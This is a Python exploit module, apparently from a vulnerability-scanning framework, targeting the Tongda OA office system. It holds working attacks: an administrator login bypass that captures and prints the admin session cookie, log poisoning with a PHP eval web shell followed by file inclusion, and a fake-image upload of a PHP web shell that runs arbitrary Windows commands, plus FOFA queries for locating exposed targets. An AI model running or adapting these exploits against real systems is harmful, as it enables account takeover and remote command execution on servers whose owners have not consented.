from util.ExpRequest import ExpRequest,Output
from operator import methodcaller
from ClassCongregation import random_name
import re
class Tongda():
    def __init__(self, **env):
        """
        基础参数初始化
        """
        self.url = env.get('url')
        self.cookie = env.get('cookie')
        self.cmd = env.get('cmd')
        self.pocname = env.get('pocname')
        self.vuln = env.get('vuln')
        self.timeout = int(env.get('timeout'))
        self.retry_time = int(env.get('retry_time'))
        self.retry_interval = int(env.get('retry_interval'))
        self.win_cmd = 'cmd /c '+ env.get('cmd', 'echo VuLnEcHoPoCSuCCeSS')
        self.linux_cmd = env.get('cmd', 'echo VuLnEcHoPoCSuCCeSS')
        self.status = env.get('status')

    def AnyAdministratorAccountToLogIn(self):
        appName = 'Tongda'
        pocname = 'AnyAdministratorAccountToLogIn'
        method = 'get'
        desc = '通达OA任意使用管理员账号登录'
        path1 = '/general/login_code.php'
        path2 ='/logincheck_code.php'
        path3='/general/index.php'
        fofa = 'app="通达OA网络智能办公系统"'
        #输出类
        output = Output(pocname)
        #请求类
        exprequest = ExpRequest(pocname, output)
        try:
            res = exprequest.get(self.url+path1, timeout=self.timeout, verify=False)
            restext = str(res.text).split('{')
            codeuid = restext[-1].replace('}"}', '').replace('\r\n', '')
            resp = exprequest.post(self.url+path2, data={'CODEUID': '{'+codeuid+'}', 'UID': int(1)}, timeout=self.timeout, verify=False)
            head = resp.headers.get('Set-Cookie').replace('path=/', '')

            resp2 = exprequest.get(self.url+path3,headers={"Cookie":head}, timeout=self.timeout, verify=False)
            code = resp2.status_code
            con = resp2.text

            if code == 200 and (con.find("""<li><a id="on_status_1" href="javascript:""")!=-1 and con.find("""<a id="logout_btn" class="logout" href="javascript""")!=-1 ) or (con.find("通达云市场")!=-1 and con.find("通达OA在线帮助")!=-1 and con.find("注销")!=-1):
                output.fail()
                info = "存在通达OA任意使用管理员账号登录漏洞, 管理员Cookie: {}".format(head)
                output.echo_success(method, info)
                self.status = 'success'
            else:
                output.fail()
        except Exception as error:
            output.error_output(str(error))


    def FileUploadAndFileInclusion(self):
        appName = 'Tongda'
        pocname = 'FileUploadAndFileInclusion'
        method = 'get'
        #会把问好后面的内容写入到oa.access.log文件中，可以自定义文件
        path = '/ispirit/interface/gateway.php?json={}&url=../../ispirit/../../nginx/logs/oa.access.log'
        desc = '通达OA任意文件包含漏洞'
        fofa = 'app="通达OA网络智能办公系统"'
        #输出类
        output = Output(pocname)
        #请求类
        exprequest = ExpRequest(pocname, output)

        try:
            if self.vuln == 'False':
                rm = "MedusaTextPoc" + random_name(20)  # 获取随机数
                payload_rm = rm + "MedusaScanTestPoc"
                payload_test = "/ispirit/interface/gateway.php?" + payload_rm
                #把随机数写到log文件中想要写入木马把payload_test替换成payload_shell即可，用菜刀连接payload_url这个连接即可，需要改成GBK
                resp = exprequest.get(self.url+payload_test ,timeout=self.timeout, verify=False)
                #请求文件查看是否成功，是否写入
                resp2 = exprequest.get(self.url+path ,timeout=self.timeout, verify=False)
                con = resp2.text
                code2 = resp2.status_code
                code = resp.status_code
                if code == 200 and code2==200 and con.find(rm) != -1:
                    info = Medusa = "存在通达OA任意文件上传和文件包含漏洞,读取文件位置:{}".format(self.url+path)
                    output.echo_success(method, info)
                    self.status = 'success'
                else:
                    output.fail()
            else:
                payload_shell = "/ispirit/interface/gateway.php?<?php @eval($_POST[pass]);?>"
                resp = exprequest.get(self.url+payload_shell ,timeout=self.timeout, verify=False)
                resp = exprequest.get(self.url+path ,timeout=self.timeout, verify=False)
                print(resp.text)
        except Exception as error:
            output.error_output(str(error))

    def FileUploadRemoteCmd(self):
        appName = 'Tongda'
        pocname = 'FileUploadRemoteCmd'
        method = 'get'
        #会把问好后面的内容写入到oa.access.log文件中，可以自定义文件
        path = '/ispirit/im/upload.php'
        desc = '通达OA任意文件上传&远程命令执行漏洞'
        fofa = 'app="通达OA网络智能办公系统"'
        #输出类
        output = Output(pocname)
        #请求类
        exprequest = ExpRequest(pocname, output)

        try:
            if self.vuln == 'False':
                rm = random_name(50)
                rm_file = random_name(10)
                Headers1 = {
                    'Accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'X-Forwarded-For' : '127.0.0.1',
                    'Connection' : 'close',
                    'Upgrade-Insecure-Requests' : '1',
                    'Content-Type' : 'multipart/form-data; boundary=---------------------------27723940316706158781839860668'
                }

                file_data = "-----------------------------27723940316706158781839860668\r\nContent-Disposition: form-data; name=\"ATTACHMENT\"; filename=\"%s.jpg\"\r\nContent-Type: image/jpeg\r\n\r\n<?php\r\necho \"%s\"\r\n?>\n\r\n-----------------------------27723940316706158781839860668\r\nContent-Disposition: form-data; name=\"P\"\r\n\r\n1\r\n-----------------------------27723940316706158781839860668\r\nContent-Disposition: form-data; name=\"DEST_UID\"\r\n\r\n1222222\r\n-----------------------------27723940316706158781839860668\r\nContent-Disposition: form-data; name=\"UPLOAD_MODE\"\r\n\r\n1\r\n-----------------------------27723940316706158781839860668--\r\n" % (rm_file,rm)
                upload_resp = exprequest.post(self.url+path, headers=Headers1, data=file_data)
                name = "".join(re.findall("2003_(.+?)\|", upload_resp.text))
                get_shell_url = '/ispirit/interface/gateway.php'
                Headers2 = {
                    'Accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'X-Forwarded-For' : '127.0.0.1',
                    'Connection' : 'close',
                    'Upgrade-Insecure-Requests' : '1',
                    'Content-Type' : 'application/x-www-form-urlencoded'
                }
                data = {"json": "{\"url\":\"../../../general/../attach/im/2003/%s.%s.jpg\"}" % (name,rm_file)}

                get_shell_resp = exprequest.post(self.url+get_shell_url, headers=Headers2, data=data)
                con=get_shell_resp.text
                code=get_shell_resp.status_code
                if code == 200 and con.find(rm)!=-1:
                    info = "存在通达OA任意文件上传&远程命令执行漏洞, 漏洞位置:{}".format(self.url+get_shell_url)
                    output.echo_success(method, info)
                    self.status = 'success'
                else:
                    output.fail()

            else:
                cmd_rm = random_name(10)
                url1 = self.url+'/ispirit/im/upload.php'
                headers = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate",
                    "X-Forwarded-For": "127.0.0.1", "Connection": "close", "Upgrade-Insecure-Requests": "1",
                    "Content-Type": "multipart/form-data; boundary=---------------------------27723940316706158781839860668"
                    }
                data = "-----------------------------27723940316706158781839860668\r\nContent-Disposition: form-data; name=\"ATTACHMENT\"; filename=\"%s.jpg\"\r\nContent-Type: image/jpeg\r\n\r\n<?php\r\n$command=$_POST['%s'];\r\n$wsh = new COM('WScript.shell');\r\n$exec = $wsh->exec(\"cmd /c \".$command);\r\n$stdout = $exec->StdOut();\r\n$stroutput = $stdout->ReadAll();\r\necho $stroutput;\r\n?>\n\r\n-----------------------------27723940316706158781839860668\r\nContent-Disposition: form-data; name=\"P\"\r\n\r\n1\r\n-----------------------------27723940316706158781839860668\r\nContent-Disposition: form-data; name=\"DEST_UID\"\r\n\r\n1222222\r\n-----------------------------27723940316706158781839860668\r\nContent-Disposition: form-data; name=\"UPLOAD_MODE\"\r\n\r\n1\r\n-----------------------------27723940316706158781839860668--\r\n"%(cmd_rm,cmd_rm)
                result = exprequest.post(url1, headers=headers, data=data)
                name = "".join(re.findall("2003_(.+?)\|", result.text))
                url2 = self.url + '/ispirit/interface/gateway.php'
                headers = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate",
                    "X-Forwarded-For": "127.0.0.1", "Connection": "close", "Upgrade-Insecure-Requests": "1",
                    "Content-Type": "application/x-www-form-urlencoded"
                    }

                data = {"json": "{\"url\":\"../../../general/../attach/im/2003/%s.%s.jpg\"}" % (name,cmd_rm), "%s"%cmd_rm: "%s" %self.cmd}
                result = exprequest.post(url2, headers=headers, data=data)
                print(result.text)
        except Exception as error:
            output.error_output(str(error))

def check(**kwargs):
    result_list = []
    result_list.append('----------------------------')
    ExpTongda = Tongda(**kwargs)
    if kwargs['pocname'] != 'ALL':
        func = getattr(ExpTongda, kwargs['pocname'])#返回对象函数属性值，可以直接调用
        func()#调用函数
        return ExpTongda.status
    else:#调用所有函数
        for func in dir(Tongda):
            if not func.startswith("__"):
                methodcaller(func)(ExpTongda)
                result_list.append(func+' -> '+ExpTongda.status)
                ExpTongda.status = 'fail'
    result_list.append('----------------------------')
    return '\n'.join(result_list)